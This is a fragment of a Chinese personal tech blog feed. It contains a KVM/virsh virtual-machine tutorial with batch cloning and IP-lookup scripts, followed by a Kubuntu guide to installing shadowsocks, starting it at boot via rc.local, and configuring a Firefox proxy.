class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">virt-install命令有许多选项，这些选项大体可分为下面几大类，同时对每类中的常用选项也做出简单说明。</span><br><span class="line">一般选项：指定虚拟机的名称、内存大小、VCPU个数及特性等；</span><br><span class="line">-n NAME, --name=NAME：虚拟机名称，需全局惟一；</span><br><span class="line">-r MEMORY, --ram=MEMORY：虚拟机内在大小，单位为MB；</span><br><span class="line">--vcpus=VCPUS[,maxvcpus=MAX][,sockets=#][,cores=#][,threads=#]：VCPU个数及相关配置；</span><br><span class="line">--cpu=CPU：CPU模式及特性，如coreduo等；可以使用qemu-kvm -cpu ?来获取支持的CPU模式；</span><br><span class="line">安装方法：指定安装方法、GuestOS类型等；</span><br><span class="line">-c CDROM, --cdrom=CDROM：光盘安装介质；</span><br><span class="line">-l LOCATION, --location=LOCATION：安装源URL，支持FTP、HTTP及NFS等，如ftp://172.16.0.1/pub；</span><br><span class="line">--pxe：基于PXE完成安装；</span><br><span class="line">--livecd: 把光盘当作LiveCD；</span><br><span class="line">--os-type=DISTRO_TYPE：操作系统类型，如linux、unix或windows等；</span><br><span class="line">--os-variant=DISTRO_VARIANT：某类型操作系统的变体，如rhel5、fedora8等；</span><br><span class="line">-x EXTRA, --extra-args=EXTRA：根据--location指定的方式安装GuestOS时，用于传递给内核的额外选项，例如指定kickstart文件的位置，--extra-args &quot;ks=http://172.16.0.1/class.cfg&quot;</span><br><span class="line">--boot=BOOTOPTS：指定安装过程完成后的配置选项，如指定引导设备次序、使用指定的而非安装的kernel/initrd来引导系统启动等 ；例如：</span><br><span class="line">--boot  cdrom,hd,network：指定引导次序；</span><br><span class="line">--boot kernel=KERNEL,initrd=INITRD,kernel_args=”console=/dev/ttyS0”：指定启动系统的内核及initrd文件；</span><br><span class="line">存储配置：指定存储类型、位置及属性等；</span><br><span class="line">--disk=DISKOPTS：指定存储设备及其属性；格式为--disk /some/storage/path,opt1=val1，opt2=val2等；常用的选项有：</span><br><span class="line">device：设备类型，如cdrom、disk或floppy等，默认为disk；</span><br><span class="line">bus：磁盘总结类型，其值可以为ide、scsi、usb、virtio或xen；</span><br><span class="line">perms：访问权限，如rw、ro或sh（共享的可读写），默认为rw；</span><br><span class="line">size：新建磁盘映像的大小，单位为GB；</span><br><span class="line">cache：缓存模型，其值有none、writethrouth（缓存读）及writeback（缓存读写）；</span><br><span class="line">format：磁盘映像格式，如raw、qcow2、vmdk等；</span><br><span class="line">sparse：磁盘映像使用稀疏格式，即不立即分配指定大小的空间；</span><br><span class="line">--nodisks：不使用本地磁盘，在LiveCD模式中常用；</span><br><span class="line">网络配置：指定网络接口的网络类型及接口属性如MAC地址、驱动模式等；</span><br><span class="line">-w NETWORK, --network=NETWORK,opt1=val1,opt2=val2：将虚拟机连入宿主机的网络中，其中NETWORK可以为：</span><br><span class="line">bridge=BRIDGE：连接至名为“BRIDEG”的桥设备；</span><br><span class="line">network=NAME：连接至名为“NAME”的网络；</span><br><span class="line">它常用的选项还有：</span><br><span class="line">model：GuestOS中看到的网络设备型号，如e1000、rtl8139或virtio等；</span><br><span class="line">mac：固定的MAC地址；省略此选项时将使用随机地址，但无论何种方式，对于KVM来说，其前三段必须为52:54:00；</span><br><span class="line">--nonetworks：虚拟机不使用网络功能；</span><br><span class="line">图形配置：定义虚拟机显示功能相关的配置，如VNC相关配置；</span><br><span class="line">--graphics TYPE,opt1=val1,opt2=val2：指定图形显示相关的配置，此选项不会配置任何显示硬件（如显卡），而是仅指定虚拟机启动后对其进行访问的接口；</span><br><span class="line">TYPE：指定显示类型，可以为vnc、sdl、spice或none等，默认为vnc；</span><br><span class="line">port：TYPE为vnc或spice时其监听的端口；</span><br><span class="line">listen：TYPE为vnc或spice时所监听的IP地址，默认为127.0.0.1，可以通过修改/etc/libvirt/qemu.conf定义新的默认值；</span><br><span class="line">password：TYPE为vnc或spice时，为远程访问监听的服务进指定认证密码；</span><br><span class="line">--noautoconsole：禁止自动连接至虚拟机的控制台；</span><br><span class="line">设备选项：指定文本控制台、声音设备、串行接口、并行接口、显示接口等；</span><br><span class="line">--serial=CHAROPTS：附加一个串行设备至当前虚拟机，根据设备类型的不同，可以使用不同的选项，格式为“--serial type,opt1=val1,opt2=val2,...”，例如：</span><br><span class="line">--serial pty：创建伪终端；</span><br><span class="line">--serial dev,path=HOSTPATH：附加主机设备至此虚拟机；</span><br><span class="line">--video=VIDEO：指定显卡设备模型，可用取值为cirrus、vga、qxl或vmvga；</span><br><span class="line"></span><br><span class="line">虚拟化平台：虚拟化模型（hvm或paravirt）、模拟的CPU平台类型、模拟的主机类型、hypervisor类型（如kvm、xen或qemu等）以及当前虚拟机的UUID等；</span><br><span class="line">-v, --hvm：当物理机同时支持完全虚拟化和半虚拟化时，指定使用完全虚拟化；</span><br><span class="line">-p, --paravirt：指定使用半虚拟化；</span><br><span class="line">--virt-type：使用的hypervisor，如kvm、qemu、xen等；所有可用值可以使用’virsh capabilities’命令获取；</span><br><span class="line">其它：</span><br><span class="line">--autostart：指定虚拟机是否在物理启动后自动启动；</span><br><span class="line">--print-xml：如果虚拟机不需要安装过程(--import、--boot)，则显示生成的XML而不是创建此虚拟机；默认情况下，此选项仍会创建磁盘映像；</span><br><span class="line">--force：禁止命令进入交互式模式，如果有需要回答yes或no选项，则自动回答为yes；</span><br><span class="line">--dry-run：执行创建虚拟机的整个过程，但不真正创建虚拟机、改变主机上的设备配置信息及将其创建的需求通知给libvirt；</span><br><span class="line">-d, --debug：显示debug信息；</span><br><span class="line"></span><br><span class="line">尽管virt-install命令有着类似上述的众多选项，但实际使用中，其必须提供的选项仅包括--name、--ram、--disk（也可是--nodisks）及安装过程相关的选项。此外，有时还需要使用括--connect=CONNCT选项来指定连接至一个非默认的hypervisor。</span><br></pre></td></tr></table></figure><ul><li>一个例子</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">下面的示例将创建一个名为rhel6的虚拟机，其有两个虚拟CPU，安装方法为FTP，并指定了ks文件的位置，磁盘映像文件为稀疏格式，连接至物理主机上的名为brnet0的桥接网络：</span><br><span class="line"></span><br><span class="line">]# virt-install \</span><br><span class="line">    --connect qemu:///system \</span><br><span class="line">    --virt-type kvm \</span><br><span class="line">    --name rhel6 \</span><br><span class="line">    --ram 1024 \</span><br><span class="line">    --vcpus 2 \</span><br><span class="line">    --network bridge=brnet0 \</span><br><span class="line">    --disk path=/VMs/images/rhel6.img,size=120,sparse \</span><br><span class="line">    --location ftp://172.16.0.1/rhel6/dvd \</span><br><span class="line">    --extra_args “ks=http://172.16.0.1/rhel6.cfg” \</span><br><span class="line">    --os-variant rhel6 \</span><br><span class="line">    --force</span><br></pre></td></tr></table></figure><ul><li>img安装</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">]# mv cirros-no_cloud-0.3.0-x86_64-disk.img c1.img</span><br><span class="line">[root@master ~]# qemu-img info c1.img </span><br><span class="line">image: c1.img</span><br><span class="line">file format: qcow2</span><br><span class="line">virtual size: 39M (41126400 bytes)</span><br><span class="line">disk size: 11M</span><br><span class="line">cluster_size: 65536</span><br><span class="line">Format specific information:</span><br><span class="line">    compat: 0.10</span><br><span class="line"></span><br><span class="line">]# virt-manager &amp;</span><br><span class="line">#采用import镜像文件方法，第四项进行图形安装。</span><br><span class="line">]# virsh list</span><br><span class="line"> Id    Name                           State</span><br><span class="line">----------------------------------------------------</span><br><span class="line"> 2     centos6.9                      running</span><br><span class="line"></span><br><span class="line">]# virsh</span><br><span class="line">Welcome to virsh, the virtualization interactive terminal.</span><br><span class="line"></span><br><span class="line">Type:  &apos;help&apos; for help with commands</span><br><span class="line">       &apos;quit&apos; to quit</span><br><span class="line">virsh # console centos6.9</span><br><span class="line">Connected to domain centos6.9</span><br><span class="line">Escape character is ^]</span><br><span class="line">login as &apos;mageedu&apos; user. default password: &apos;mageedu.com&apos;. use &apos;sudo&apos; for root.</span><br><span class="line">cirros login: mageedu </span><br><span class="line">Password: </span><br><span class="line">$ sudo su -</span><br><span class="line"># ls</span><br><span class="line"></span><br><span class="line">#### ctrl+] 退出终端 ####</span><br><span class="line"></span><br><span class="line">virsh # help domain   #虚拟机管理</span><br><span class="line">virsh # domstats centos6.9</span><br><span class="line">Domain: &apos;centos6.9&apos;</span><br><span class="line">  state.state=1</span><br><span class="line">  state.reason=1</span><br><span class="line">  cpu.time=16312974545</span><br><span class="line">  cpu.user=1730000000</span><br><span class="line">····</span><br><span class="line"></span><br><span class="line">------管理虚拟机domain------</span><br><span class="line">]# virsh list  </span><br><span class="line">]# virsh start c2</span><br><span class="line">]# virsh destroy c2      </span><br><span class="line">]# virsh reboot c2</span><br><span class="line">]# virsh undefine c2</span><br><span class="line">]# virsh save c2 /tmp/c2.sanp</span><br><span class="line">]# virsh restore /tmp/c2.sanp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----hypervisor----</span><br><span class="line">]# virsh nodeinfo</span><br><span class="line">]# virsh capabilities</span><br><span class="line"></span><br><span class="line">----Interface----- </span><br><span class="line">#管理hypervisor的网络iface</span><br><span class="line">----Networking----</span><br><span class="line">#管理guest的网络</span><br><span class="line">----Storage Pool----</span><br><span class="line">#存储池管理</span><br></pre></td></tr></table></figure><p>配置文件<code>/etc/libvirt/qemu/centos6.9.xml</code>,修改部分内容即可复制新虚拟机.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">]# cp /etc/libvirt/qemu/centos6.9.xml /etc/libvirt/qemu/c2.xml</span><br><span class="line">]# vim /etc/libvirt/qemu/c2.xml   </span><br><span class="line">###将centos6.9替换成c2，uuid,source的path等修改即可</span><br><span class="line">##准备qcow2及img文件</span><br><span class="line">]# qemu-img create -f qcow2 -o size=40G /images/vml/c2.qcow2</span><br><span class="line">]# mv cirros-no_cloud-0.3.0-x86_64-disk.img c2.img</span><br><span class="line"></span><br><span class="line">#创建虚拟机并进入终端。</span><br><span class="line">]# virsh create --console /etc/libvirt/qemu/c2.xml</span><br></pre></td></tr></table></figure><h2 id="批量创建虚拟机"><a href="#批量创建虚拟机" class="headerlink" title="批量创建虚拟机"></a>批量创建虚拟机</h2><p>当然，如果批量创建虚拟机机，上面的操作依然繁琐，这里推荐一个脚本复制，时间会稍长。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..30&#125;; do </span><br><span class="line">virt-clone --connect=qemu:///system -o temp -n node$i -f /data/node$i.img</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>当然，也有批量删除的.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..30&#125;; do </span><br><span class="line">do virsh undefine node$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这里，每个虚拟机都有相应的ip,桥接的网卡是172.20/16网段的。要求能获取每个虚拟机的Ip,这里推荐一个脚本获取，当然，需要相应主机是running状态的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">]# vim vish.sh</span><br><span class="line">#!/bin/bash </span><br><span class="line">#ping当前网段内在线的主机,以便产生arp记录. </span><br><span class="line">for ip in 172.20.128.&#123;1..253&#125;;do</span><br><span class="line">        &#123; ping -c1 $ip &gt;/dev/null 2&gt;&amp;1 </span><br><span class="line">        &#125;&amp; </span><br><span class="line">done</span><br><span class="line">#依次查找arp记录. </span><br><span class="line">running_vms=`virsh list |grep running` </span><br><span class="line">echo -ne &quot;共有`echo &quot;$running_vms&quot;|wc -l`个虚拟机在运行.\n&quot; </span><br><span class="line">for i in `echo &quot;$running_vms&quot; | awk &apos;&#123; print $2 &#125;&apos;`;do </span><br><span class="line">        mac=`virsh dumpxml $i |grep &quot;mac address&quot;|sed &quot;s/.*&apos;\(.*\)&apos;.*/\1/g&quot;`</span><br><span class="line">        ip=`arp -ne |grep &quot;$mac&quot; |awk &apos;&#123;printf $1&#125;&apos;` </span><br><span class="line">        printf &quot;%-30s %-30s\n&quot; $i $ip </span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">]# chmod +x virsh.sh</span><br><span class="line">]# ./virt.sh </span><br><span class="line">共有31个虚拟机在运行.</span><br><span class="line">ubuntu16.04                    172.20.128.166                </span><br><span class="line">node1                          172.20.128.201                </span><br><span class="line">node2                          172.20.128.202                </span><br><span class="line">node3                          172.20.128.203                </span><br><span class="line">node4                          172.20.128.204                </span><br><span class="line">node5                          172.20.128.205                </span><br><span class="line">node6                          172.20.128.206                </span><br><span class="line">node7                          172.20.128.207                </span><br><span class="line">node8                          172.20.128.208                </span><br><span class="line">node9                          172.20.128.209                </span><br><span class="line">node10                         172.20.128.210                </span><br><span class="line">node11                         172.20.128.211                </span><br><span class="line">node12                         172.20.128.212                </span><br><span class="line">node13                         172.20.128.213                </span><br><span class="line">node14                         172.20.128.215                </span><br><span class="line">node15                         172.20.128.214                </span><br><span class="line">node16                         172.20.128.217                </span><br><span class="line">node17                         172.20.128.216                </span><br><span class="line">node18                         172.20.128.218                </span><br><span class="line">node19                         172.20.128.219                </span><br><span class="line">node20                         172.20.128.220                </span><br><span class="line">node21                         172.20.128.222                </span><br><span class="line">node22                         172.20.128.221                </span><br><span class="line">node23                         172.20.128.224                </span><br><span class="line">node24                         172.20.128.229                </span><br><span class="line">node25                         172.20.128.227                </span><br><span class="line">node26                         172.20.128.225                </span><br><span class="line">node27                         172.20.128.223                </span><br><span class="line">node28                         172.20.128.226                </span><br><span class="line">node29                         172.20.128.230                </span><br><span class="line">node30                         172.20.128.228</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="virtul" scheme="https://fenghong.tech/tags/virtul/"/>
    
      <category term="虚拟化技术" scheme="https://fenghong.tech/tags/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Kubuntu 从安装到科学上网</title>
    <link href="https://fenghong.tech/kubuntu.html"/>
    <id>https://fenghong.tech/kubuntu.html</id>
    <published>2018-07-25T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>科学上网</li><li>lxc容器</li></ul><p>系统：Kubuntu 18.04 X86_64</p><h1 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h1><ul><li>安装代理</li></ul><p>安装<code>shadowsocks</code>,这里不要用系统自带的<code>sudo apt install shadowsocks</code>,下载的不是最新的，不支持加密选项，会报错，这里博主犯错了，习惯了用<code>vim</code>编辑，所以这里我推荐使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python-pip -y</span><br><span class="line">$ sudo apt-get install git -y</span><br><span class="line">$ pip install git+https://github.com/shadowsocks/shadowsocks.git@master</span><br><span class="line">$ sudo apt-get install vim -y</span><br><span class="line"></span><br><span class="line">#下载的shadowsocks是最新版，在/home/$user/.local/bin/&#123;ssserver,sslocal&#125;</span><br><span class="line"></span><br><span class="line">$ sudo echo &quot;export PATH=/home/feng/.local/bin:$PATH&quot; &gt; /etc/profile.d/ss.sh</span><br><span class="line">$ . /etc/profile.d/ss.sh</span><br><span class="line">$ echo $PATH</span><br><span class="line">/home/feng/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line"></span><br><span class="line">#已经在环境变量里面，所以可以直接运行。</span><br></pre></td></tr></table></figure><ul><li>配置文件创建</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/shadowsocks.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;: &quot;serverip&quot;,</span><br><span class="line">    &quot;server_port&quot;: port,</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;: 1080,</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;password&quot;: &quot;password&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;,</span><br><span class="line">    &quot;fast_open&quot;:false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>启动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sslocal -c /etc/shadowsocks.json -d start </span><br><span class="line"></span><br><span class="line">#sslocal -h  查看帮助</span><br><span class="line">  -c CONFIG              path to config file</span><br><span class="line">  -s SERVER_ADDR         server address</span><br><span class="line">  -p SERVER_PORT         server port, default: 8388</span><br><span class="line">  -b LOCAL_ADDR          local binding address, default: 127.0.0.1</span><br><span class="line">  -l LOCAL_PORT          local port, default: 1080</span><br><span class="line">  -k PASSWORD            password</span><br><span class="line">  -m METHOD              encryption method, default: aes-256-cfb</span><br></pre></td></tr></table></figure><h2 id="默认开机启动"><a href="#默认开机启动" class="headerlink" title="默认开机启动"></a>默认开机启动</h2><p>ubuntu18.04默认是<code>systemd</code>管理启动</p><p>以前启动mysql服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysqld start</span><br></pre></td></tr></table></figure><p>现在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mariadb.service</span><br></pre></td></tr></table></figure><p><code>systemd</code> 默认读取 <code>/etc/systemd/system</code> 下的配置文件，该目录下的文件会链接<code>/lib/systemd/system/</code>下的文件。</p><p>执行 <code>ls /lib/systemd/system</code> 你可以看到有很多启动脚本，其中就有我们需要的 <code>rc.local.service</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ cat /lib/systemd/system/rc.local.service </span><br><span class="line">#  SPDX-License-Identifier: LGPL-2.1+</span><br><span class="line">#</span><br><span class="line">#  This file is part of systemd.</span><br><span class="line">#</span><br><span class="line">#  systemd is free software; you can redistribute it and/or modify it</span><br><span class="line">#  under the terms of the GNU Lesser General Public License as published by</span><br><span class="line">#  the Free Software Foundation; either version 2.1 of the License, or</span><br><span class="line">#  (at your option) any later version.</span><br><span class="line"></span><br><span class="line"># This unit gets pulled automatically into multi-user.target by</span><br><span class="line"># systemd-rc-local-generator if /etc/rc.local is executable.</span><br><span class="line">[Unit]</span><br><span class="line">Description=/etc/rc.local Compatibility</span><br><span class="line">Documentation=man:systemd-rc-local-generator(8)</span><br><span class="line">ConditionFileIsExecutable=/etc/rc.local</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">GuessMainPID=no</span><br></pre></td></tr></table></figure><ul><li>正常启动文件</li></ul><blockquote><p>[Unit] 段: 启动顺序与依赖关系</p><p>[Service] 段: 启动行为,如何启动，启动类型</p><p>[Install] 段: 定义如何安装这个配置文件，即怎样做到开机启动</p></blockquote><p>可以看出，<code>/etc/rc.local</code> 的启动顺序是在网络后面，但是显然它少了 Install 段，也就没有定义如何做到开机启动，所以显然这样配置是无效的。 因此我们就需要在后面帮他加上 [Install] 段:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Install]  </span><br><span class="line">WantedBy=multi-user.target  </span><br><span class="line">Alias=rc-local.service</span><br></pre></td></tr></table></figure><p>这里需要注意一下，ubuntu-18.04 默认是没有 <code>/etc/rc.local</code> 这个文件的，需要自己创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo touch /etc/rc.local</span><br></pre></td></tr></table></figure><p>然后把你需要启动脚本写入 <code>/etc/rc.local</code> ，我们不妨写一些测试的脚本放在里面，以便验证脚本是否生效.</p><ul><li>创建开机启动的软链接,这点也比较关键，<code>systemd</code> 默认读取 <code>/etc/systemd/system</code> 下的配置文件, 所以还需要在 <code>/etc/systemd/system</code> 目录下创建软链接</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /lib/systemd/system/rc.local.service /etc/systemd/system/</span><br></pre></td></tr></table></figure><ul><li>开机自动启动shadowsocks</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/rc.local</span><br><span class="line"></span><br><span class="line">home/feng/.local/bin/sslocal -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><ul><li>tips，如果上述操作不成功，可以尝试手工启动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">]# vim ss.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">/usr/bin/sudo $HOME/.local/bin/sslocal -c /etc/shadowsocks.json -d start</span><br><span class="line">]# chmod +x ss.sh</span><br><span class="line">]# ./ss.sh</span><br><span class="line">输入秘密即可开启</span><br></pre></td></tr></table></figure><h2 id="fixfox代理设置"><a href="#fixfox代理设置" class="headerlink" title="fixfox代理设置"></a>fixfox代理设置</h2><ul><li>打开firefox浏览器，添加<code>Proxy SwitchyOmega</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.在浏览器里输入about:addons</span><br><span class="line">2.在 Search on addons.mozilla.org里输入 Proxy SwitchyOmega </span><br><span class="line">3.点击Add添加后，有浏览器告诉你如何安装</span><br></pre></td></tr></table></figure><ul><li>设置Proxy</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#点击已经添加的Proxy SwitchyOmega </span><br><span class="line">1.#点击Profiles下的Proxy</span><br><span class="line">Scheme Protocol Server Port </span><br><span class="line">(default) SOCKS5127.0.0.1   1080</span><br><span class="line"></span><br><span class="line">2.#点击Profiles下的auto switch</span><br><span class="line">添加</span><br><span class="line">Rule list rules (Any request matching the rule list below) proxy</span><br><span class="line">Default             Direct</span><br><span class="line"></span><br><span class="line">Rule List Config</span><br><span class="line">Rule List Format SwitchyAutoProxy #选择AutoProxy</span><br><span class="line"></span><br><span class="line">Rule List URL</span><br><span class="line">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</span><br><span class="line">#设置完后，点击Download Profile Now </span><br><span class="line"></span><br><span class="line">3.#点击ACTIONS ----Apply changes  </span><br><span 